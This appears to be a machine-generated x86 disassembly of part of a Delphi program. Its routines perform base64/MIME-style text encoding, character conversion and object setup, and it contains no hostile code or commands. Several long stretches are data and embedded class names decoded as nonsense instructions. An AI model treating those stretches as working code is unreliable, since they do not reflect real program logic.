shr edx 0x8
call sub_404300
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov dx [ ebp - 0x10 ]
and dx 0xff
call sub_404300
push [ ebp - 0x1c ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404498
inc edi
jmp r-xdata
mov al [ esi + edi ]
and al 0xfe
cmp al 0xde
jne r-xdata
cmp edi [ ebp - 0xc ]
jge r-xdata
xor eax eax
mov al [ esi + edi - 0x1 ]
mov ax [ eax * 2 + rw-data ]
mov dl [ esi + edi ]
sub dl 0xde
je r-xdata
add edi 0x2
xor eax eax
mov al [ esi + edi ]
mov ax [ eax * 2 + rw-data ]
mov [ ebp - 0x10 ] ax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
test ax ax
je r-xdata
dec dl
je r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] ax
inc edi
jmp r-xdata
cmp ax 0x2550
jb r-xdata
jmp r-xdata
push [ ebp - 0x8 ]
lea eax [ ebp - 0x20 ]
xor edx edx
mov dl bl
movzx ecx [ ebp - 0x10 ]
shr ecx 0x8
add edx ecx
call sub_404300
push [ ebp - 0x20 ]
lea eax [ ebp - 0x24 ]
mov dx [ ebp - 0x10 ]
and dx 0xff
call sub_404300
push [ ebp - 0x24 ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404498
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_4043e0
mov [ ebp - 0xd ] 0x1
cmp ax 0x255c
ja r-xdata
inc eax
mov [ ebp - 0x10 ] ax
inc edi
sub_47e0c0
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_47e472
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_4043e0
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0xc ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4043d8
mov esi eax
add esi 0x2
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov dl [ edx - 0x11 ]
call sub_404300
mov eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_408248
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi [ eax - 0xc ]
inc edi
cmp edi ebx
jle r-xdata
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x3c ]
call sub_4043e0
mov eax [ ebp + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e479
lea eax [ ebp - 0x30 ]
mov edx 0xc
call sub_40413c
retn
lea eax [ esi + 0x4 ]
cmp eax 0x4b
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov al [ eax + ebx - 0x1 ]
mov edx [ ebp + 0x8 ]
and eax 0xff
bt [ edx - 0x38 ] eax
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
movzx eax [ eax + ebx - 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x40 ] eax
mov eax edi
sub eax ebx
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
push [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ eax - 0x3c ]
push r-xdata
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx 0x4
call sub_404498
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4043d8
mov esi eax
add esi 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
cmp [ eax + ebx - 0x1 ] 0x20
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov dl [ edx + ebx - 0x1 ]
call sub_404300
jmp r-xdata
mov eax [ ebp + 0x8 ]
push [ eax - 0x4 ]
lea eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
shr edx 0x2
mov dl [ edx + rw-data ]
call sub_404300
push [ ebp - 0x10 ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
and edx 0x3
shl edx 0x4
mov dl [ edx + rw-data ]
call sub_404300
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx 0x4
call sub_404498
jmp r-xdata
dec eax
je r-xdata
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
movzx eax [ eax + ebx - 0x1 ]
mov edx 0x2
call sub_408620
mov ecx [ ebp - 0xc ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404424
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4041b0
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043d8
add eax esi
cmp eax 0x4b
jle r-xdata
add esi 0x4
add ebx 0x3
cmp edi ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
movzx eax [ eax + ebx ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov eax [ ebp + 0x8 ]
push [ eax - 0x4 ]
lea eax [ ebp - 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
shr edx 0x2
mov dl [ edx + rw-data ]
call sub_404300
push [ ebp - 0x18 ]
lea eax [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
and edx 0x3
shl edx 0x4
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x44 ]
shr ecx 0x4
add edx ecx
mov dl [ edx + rw-data ]
call sub_404300
push [ ebp - 0x1c ]
lea eax [ ebp - 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x44 ]
and edx 0xf
shl edx 0x2
mov dl [ edx + rw-data ]
call sub_404300
push [ ebp - 0x20 ]
push r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx 0x5
call sub_404498
jmp r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx [ ebp - 0x4 ]
call sub_4043e0
mov eax [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4043d8
add esi eax
inc ebx
cmp edi ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
push [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ eax - 0x3c ]
push r-xdata
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx 0x4
call sub_404498
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4043d8
mov esi eax
add esi 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
movzx eax [ eax + ebx ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x44 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
movzx eax [ eax + ebx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
push [ eax - 0x4 ]
lea eax [ ebp - 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
shr edx 0x2
mov dl [ edx + rw-data ]
call sub_404300
push [ ebp - 0x24 ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
and edx 0x3
shl edx 0x4
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x44 ]
shr ecx 0x4
add edx ecx
mov dl [ edx + rw-data ]
call sub_404300
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x44 ]
and edx 0xf
shl edx 0x2
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x48 ]
shr ecx 0x6
add edx ecx
mov dl [ edx + rw-data ]
call sub_404300
push [ ebp - 0x2c ]
lea eax [ ebp - 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x48 ]
and edx 0x3f
mov dl [ edx + rw-data ]
call sub_404300
push [ ebp - 0x30 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffc
mov edx 0x5
call sub_404498
jmp r-xdata
sub_47e4bc
push ebp
mov ebp esp
add esp 0xffffff48
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x3c ] ebx
mov esi edx
lea edi [ ebp - 0x6c ]
push ecx
mov ecx 0x8
[ edi ] [ esi ]
pop ecx
mov [ ebp - 0x11 ] cl
mov ebx eax
mov eax [ ebp + 0xc ]
call sub_4045c8
xor eax eax
push ebp
push sub_47e73c
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebp + 0x10 ]
sub al 0x2
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx ebx
call sub_4041b0
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_47de84
jmp r-xdata
mov esi r-xdata
lea edi [ ebp - 0xac ]
mov ecx 0x8
[ edi ] [ esi ]
lea eax [ ebp - 0xac ]
lea edx [ ebp - 0x6c ]
mov cl 0x20
call sub_402e5c
lea esi [ ebp - 0xac ]
lea edi [ ebp - 0x8c ]
mov ecx 0x8
[ edi ] [ esi ]
lea esi [ ebp - 0x8c ]
lea edi [ ebp - 0xac ]
mov ecx 0x8
[ edi ] [ esi ]
lea eax [ ebp - 0xac ]
mov edx r-xdata
mov cl 0x20
call sub_402e5c
lea esi [ ebp - 0xac ]
lea edi [ ebp - 0x38 ]
mov ecx 0x8
[ edi ] [ esi ]
push r-xdata
push [ ebp + 0xc ]
push r-xdata
lea eax [ ebp - 0xb0 ]
mov dl [ ebp - 0x11 ]
call sub_404300
push [ ebp - 0xb0 ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x5
call sub_404498
lea eax [ ebp - 0x3c ]
mov edx r-xdata
call sub_4041b0
mov eax [ ebp - 0x18 ]
call sub_4043d8
mov [ ebp - 0xc ] eax
mov ebx 0x1
lea eax [ ebp - 0x4 ]
call sub_404118
xor eax eax
mov [ ebp - 0x10 ] eax
cmp ebx [ ebp - 0xc ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x18 ]
call sub_40416c
jmp r-xdata
cmp [ ebp - 0x11 ] 0x38
jne r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov esi ebx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e743
lea eax [ ebp - 0xb8 ]
mov edx 0x3
call sub_40413c
lea eax [ ebp - 0x3c ]
call sub_404118
lea eax [ ebp - 0x18 ]
call sub_404118
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
lea eax [ ebp + 0xc ]
call sub_404118
retn
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_40416c
push ebp
mov eax ebx
call sub_47e0c0
pop ecx
cmp ebx [ ebp - 0xc ]
jg r-xdata
mov [ ebp - 0x4c ] ebx
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov al [ eax + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jb r-xdata
cmp ebx [ ebp - 0xc ]
jg r-xdata
inc ebx
test al al
je r-xdata
mov edx [ ebp - 0x18 ]
mov dl [ edx + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x18 ]
mov dl [ edx + ebx - 0x1 ]
and edx 0xff
bt [ ebp - 0x8c ] edx
jae r-xdata
lea eax [ ebp - 0xb8 ]
push eax
mov ecx ebx
sub ecx esi
mov edx esi
mov eax [ ebp - 0x18 ]
call sub_404638
mov edx [ ebp - 0xb8 ]
lea eax [ ebp - 0x4 ]
call sub_4043e0
push ebp
mov eax esi
call sub_47e0c0
pop ecx
cmp ebx [ ebp - 0xc ]
jle r-xdata
lea eax [ ebp - 0xb4 ]
push eax
mov ecx [ ebp - 0x4c ]
sub ecx esi
mov edx esi
mov eax [ ebp - 0x18 ]
call sub_404638
mov edx [ ebp - 0xb4 ]
lea eax [ ebp - 0x4 ]
call sub_4043e0
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
inc ebx
mov al 0x1
sub_47e7a7
inc [ edx ]
add [ eax ] al
add [ edi ] bh
cmp eax 0x8b550000
in al dx
xor eax eax
push ebp
push sub_47e7d5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e7dc
retn
sub_47e921
in al dx
inc edi
add [ 0x4d644954 ] dl
jae r-xdata
shr ah 0xe9
popad
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
shl [ edx ] 0x1
inc eax
add [ eax ] bh
in al dx
inc edi
add [ 0x4d644954 ] dl
jae r-xdata
outsb
outsw
mov eax eax
mov cl ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x80047e9 ] cl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax - 0x11 ] bh
inc edi
add [ eax ] al
push esp
inc edi
add [ eax ] bh
push esp
inc edi
add [ eax + 0x54 ] ch
inc edi
add ah ch
sub al [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x680040 ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
dec ebp
jae r-xdata
popad
inc esp
arpl [ gs : edi + 0x64 ] bp
jb r-xdata
add [ eax ] al
add [ eax + 0x500e0004 ] al
jb r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
add [ eax - 0x27ffb8ae ] bh
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + ebp * 8 ] ch
inc edi
add [ edx + ebp * 8 + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bh
0x700047 0x0
imul esi [ ebx + 0x74 ] 0xe9ecc08b
arpl [ edi + 0x64 ] bp
jb r-xdata
imul esi [ ebx + 0x73 ] 0x436e6f69
outsd
mov eax eax
sbb al 0xeb
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 ] ah
inc edi
add [ eax ] cl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebp + ebp * 8 + 0x47 ] bh
add [ ebp + ebp * 8 + 0x54150047 ] bl
dec ecx
dec ebp
jae r-xdata
cmp al 0x10
inc eax
add [ eax + eax ] ch
[ eax + eax ]
0x11070047 0x4954
shl [ edx ] 0x1
inc eax
add [ esi + ebp * 8 + 0x54150047 ] cl
dec ecx
dec ebp
jae r-xdata
outsb
outsw
mov eax eax
mov bl ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x80047eb ] cl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
rcl [ ebx + 0x56 ] 0x57
popad
inc ebp
outsb
fimul [ ebx - 0x742dcc10 ]
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
mov eax esi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
dec ebx
jne r-xdata
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
xor esi esi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
imul esi [ ebx + 0x74 ] 0x5653c08b
push edi
inc edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov esi [ eax ]
call [ esi ]
mov esi eax
test esi esi
jne r-xdata
sub_47e9c8
cmp [ ecx + 0x47 ] dl
add ah ch
and [ edx ] eax
pop eax
xor eax 0x1b400040
inc edx
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ eax - 0x27ffb8ae ] bh
xchg ebx eax
inc ecx
add ah dh
sbb eax 0x92f40042
inc ecx
add ah cl
push ds
inc edx
add [ eax - 0x23ffbde3 ] bl
push ds
inc edx
add ah dl
pop ds
inc edx
add [ edx ] al
inc edx
add ah ch
push ds
inc edx
add ah ah
push ds
inc edx
add [ edx ] cl
inc edx
add [ eax - 0x11 ] bh
inc edi
add [ eax ] al
push esp
inc edi
add [ eax ] bh
push esp
inc edi
add [ eax + 0x54 ] ch
inc edi
add ah ch
sub al [ eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x680040 ] dl
add [ eax ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
dec ebp
jae r-xdata
add [ eax ] al
add [ eax + 0x500e0004 ] al
jb r-xdata
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
arpl [ edi + 0x64 ] bp
jb r-xdata
imul esi [ ebx + 0x73 ] 0x436e6f69
outsd
mov eax eax
sbb al 0xeb
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 ] ah
inc edi
add [ eax ] cl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebp + ebp * 8 + 0x47 ] bh
add [ ebp + ebp * 8 + 0x54150047 ] bl
dec ecx
dec ebp
jae r-xdata
cmp al 0x10
inc eax
add [ eax + eax ] ch
[ eax + eax ]
0x11070047 0x4954
shl [ edx ] 0x1
inc eax
add [ esi + ebp * 8 + 0x54150047 ] cl
dec ecx
dec ebp
jae r-xdata
outsb
outsw
mov eax eax
mov bl ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x80047eb ] cl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
rcl [ ebx + 0x56 ] 0x57
popad
inc ebp
outsb
fimul [ ebx - 0x742dcc10 ]
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
mov eax esi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
dec ebx
jne r-xdata
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
xor esi esi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
imul esi [ ebx + 0x74 ] 0x5653c08b
push edi
inc edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov esi [ eax ]
call [ esi ]
mov esi eax
test esi esi
jne r-xdata
sub_47eab0
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500e0004 ] al
jb r-xdata
arpl [ edi + 0x64 ] bp
jb r-xdata
imul esi [ ebx + 0x73 ] 0x436e6f69
outsd
mov eax eax
sbb al 0xeb
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ebp * 8 ] ah
inc edi
add [ eax ] cl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebp + ebp * 8 + 0x47 ] bh
add [ ebp + ebp * 8 + 0x54150047 ] bl
dec ecx
dec ebp
jae r-xdata
shl [ edx ] 0x1
inc eax
add [ esi + ebp * 8 + 0x54150047 ] cl
dec ecx
dec ebp
jae r-xdata
outsb
outsw
mov eax eax
mov bl ch
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x80047eb ] cl
add [ eax ] al
add [ eax + 0x4c004010 ] dh
xor eax 0x35580040
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
rcl [ ebx + 0x56 ] 0x57
popad
inc ebp
outsb
fimul [ ebx - 0x742dcc10 ]
popad
inc ebp
outsb
arpl [ edi + 0x64 ] bp
jb r-xdata
mov eax esi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
dec ebx
jne r-xdata
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
xor esi esi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
imul esi [ ebx + 0x74 ] 0x5653c08b
push edi
inc edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov esi [ eax ]
call [ esi ]
mov esi eax
test esi esi
jne r-xdata
sub_47eba0
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
xor esi esi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov esi [ eax ]
call [ esi ]
mov esi eax
test esi esi
jne r-xdata
sub_47ebf4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47ec38
push ebx
push esi
push edi
push ebp
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
lea eax [ esi + 0x4 ]
call sub_40d814
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
mov eax [ esi + 0x4 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_40331c
inc edi
dec ebp
jne r-xdata
sub_47ec90
push ebx
push esi
mov esi ecx
mov ebx edx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov ecx esi
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_47ebf4
mov [ rw-data ] eax
sub_47ece4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_475220
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x6c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47ed28
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
lea eax [ esi + 0x6c ]
call sub_40d814
lea eax [ esi + 0x74 ]
call sub_40d814
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4752b8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_47eda0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
xor eax eax
push ebp
push sub_47ee2b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov ebx [ eax + 0x4 ]
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ee32
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40413c
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
push [ ebp - 0x8 ]
push r-xdata
push esi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_404498
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
sub_47ee48
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax esi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47ee8c
push ebx
push esi
push edi
push ebp
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
lea eax [ esi + 0x4 ]
call sub_40d814
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40330c
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
mov eax [ esi + 0x4 ]
mov edx edi
